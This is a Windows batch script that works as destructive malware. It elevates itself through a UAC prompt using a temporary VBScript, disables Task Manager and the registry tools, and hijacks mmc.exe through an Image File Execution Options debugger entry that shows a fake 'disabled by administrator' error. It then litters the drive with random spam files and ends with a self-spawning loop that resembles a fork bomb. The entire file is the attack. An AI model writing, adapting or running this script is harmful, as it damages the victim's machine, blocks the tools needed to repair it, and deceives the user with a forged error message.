@echo off
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies" /v DisableTaskMgr /d 1 /t REG_DWORD /f > nul
echo x=msgbox("The MMC has been disabled by administrator.", VBOkOnly+VbCritical, "Error") > C:\Windows\error_mmc.vbs
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe" /v Debugger /d C:\Windows\error_mmc.vbs /t REG_SZ /f > nul
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /d 1 /t REG_DWORD /f > nul
mkdir C:\%random%
echo spamspamspamspamspamspamspam > %random%\%random%
echo spamspamspamspamspamspamspam > %random%
start explorer.exe
start notepad.exe
%1 | %1
start %1
